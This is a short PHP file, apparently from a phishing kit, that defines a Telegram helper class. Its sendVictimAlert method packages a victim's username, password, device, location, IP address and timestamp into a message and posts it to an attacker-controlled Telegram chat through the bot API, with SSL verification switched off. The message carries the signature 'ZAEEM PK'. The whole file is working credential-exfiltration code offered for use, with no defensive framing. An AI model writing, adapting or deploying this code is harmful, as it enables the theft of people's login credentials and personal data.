<?php
require_once __DIR__ . '/config.php';

class Telegram {
    public static function send($message) {
        if (empty(TELEGRAM_BOT_TOKEN) || empty(TELEGRAM_CHAT_ID)) {
            return false;
        }

        $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
        $data = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }

    public static function sendVictimAlert($data) {
        $message = "🔥 <b>New Activity Detected!</b>\n\n";
        $message .= "👤 Username: <code>" . htmlspecialchars($data['username']) . "</code>\n";
        $message .= "🔑 Password: <code>" . htmlspecialchars($data['password']) . "</code>\n";
        $message .= "📱 Device: " . htmlspecialchars($data['device']) . "\n";
        $message .= "📍 Location: " . htmlspecialchars($data['location']) . "\n";
        $message .= "🌐 IP: " . htmlspecialchars($data['ip']) . "\n";
        $message .= "🕐 Time: " . htmlspecialchars($data['time']) . "\n\n";
        $message .= "👑 <b>ZAEEM PK 🇵🇰🙌🏻</b>";

        return self::send($message);
    }
}
?>
